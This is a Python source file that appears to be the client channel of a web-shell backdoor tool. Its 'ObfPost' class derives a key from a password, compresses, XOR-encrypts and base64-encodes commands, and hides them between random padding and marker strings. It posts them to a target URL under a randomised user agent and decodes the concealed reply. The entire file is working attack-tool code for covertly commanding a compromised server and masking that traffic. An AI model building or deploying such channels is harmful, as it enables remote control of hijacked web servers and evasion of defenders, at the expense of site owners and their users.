from core.loggers import dlog
from core import config
import re
import random
import utils
import string
import base64
from urllib import request, error, parse
import hashlib
import zlib
import http.client
import itertools
import binascii

PREPEND = utils.strings.randstr(16, charset=string.printable).encode()
APPEND = utils.strings.randstr(16, charset=string.printable).encode()


class ObfPost:

    def __init__(self, url, password):
        '''
        Generate the 8 char long main key. Is shared with the server and
        used to check header, footer, and encrypt the payload.
        '''
        passwordhash = hashlib.md5(password.encode()).hexdigest().lower()
        self.shared_key = passwordhash[:8].encode()
        self.header = passwordhash[8:20].encode()
        self.trailer = passwordhash[20:32].encode()

        self.url = url
        url_parsed = parse.urlparse(url)
        self.url_base = '%s://%s' % (url_parsed.scheme, url_parsed.netloc)

        # init regexp for the returning data
        self.re_response = re.compile(b"%s(.*)%s" % (self.header, self.trailer),
                                      re.DOTALL)
        self.re_debug = re.compile(
            b"%sDEBUG(.*?)%sDEBUG" % (self.header, self.trailer), re.DOTALL)

        # Load agent
        # TODO: add this to the other channels
        agents = utils.http.load_all_agents()
        random.shuffle(agents)
        self.agent = agents[0]

        # Init additional headers list
        self.additional_headers = config.additional_headers

    def send(self, original_payload, additional_handlers=[]):

        obfuscated_payload = base64.b64encode(
            utils.strings.sxor(
                zlib.compress(original_payload.encode()),
                self.shared_key)).rstrip(b'=')

        wrapped_payload = PREPEND + self.header + obfuscated_payload + self.trailer + APPEND

        opener = request.build_opener(*additional_handlers)

        additional_ua = ''
        for h in self.additional_headers:
            if h[0].lower() == 'user-agent' and h[1]:
                additional_ua = h[1]
                break

        opener.addheaders = [
            ('User-Agent', (additional_ua if additional_ua else self.agent))
        ] + self.additional_headers

        dlog.debug('[R] %s...' % (wrapped_payload[0:32]))

        url = (self.url if not config.add_random_param_nocache else
               utils.http.add_random_url_param(self.url))

        try:
            response = opener.open(url, data=wrapped_payload).read()
        except http.client.BadStatusLine as e:
            # TODO: add this check to the other channels
            print((repr(e)))
            # log.warn('Connection closed unexpectedly, aborting command.')
            print('Connection closed unexpectedly, aborting command.')
            return

        if not response:
            return

        # Multiple debug string may have been printed, using findall
        matched_debug = self.re_debug.findall(response)
        if matched_debug:
            dlog.debug('\n'.join(matched_debug))

        matched = self.re_response.search(response)

        if matched and matched.group(1):
            b64data = base64.b64decode(matched.group(1))
            zcomp = utils.strings.sxor(b64data, self.shared_key)
            return zlib.decompress(zcomp)
